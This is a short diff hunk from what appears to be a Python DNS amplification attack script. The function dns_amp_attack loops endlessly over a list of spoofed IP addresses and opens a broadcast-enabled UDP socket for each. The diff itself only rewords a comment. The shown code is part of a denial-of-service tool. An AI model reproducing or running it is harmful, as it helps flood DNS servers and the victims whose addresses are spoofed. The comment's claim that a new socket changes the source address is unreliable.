@@ -33,7 +33,7 @@ def dns_amp_attack(dns_server_ip, domain, interval, spoofed_ips):
     while True:
         for spoofed_ip in spoofed_ips:
             try:
-                # Create a new socket for each spoofed IP to change the source IP address
+                #   For Every new spoofed IP we create a socket
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
